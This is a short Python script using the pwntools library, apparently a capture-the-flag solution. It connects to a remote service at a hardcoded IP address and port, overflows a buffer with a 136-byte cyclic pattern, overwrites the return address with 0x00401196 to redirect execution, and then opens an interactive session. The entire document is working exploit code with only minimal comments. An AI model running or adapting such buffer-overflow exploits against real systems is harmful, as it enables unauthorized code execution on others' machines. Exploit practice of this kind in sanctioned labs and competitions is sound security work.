from pwn import p64
from pwn import *

# Start Program
io = remote ('103.13.207.177', 20003)

# Send String to overflow buffer
pay = cyclic(136)
pay += p64(0x00401196)
io.sendlineafter(b":-",pay)

# Recieve Output
io.interactive()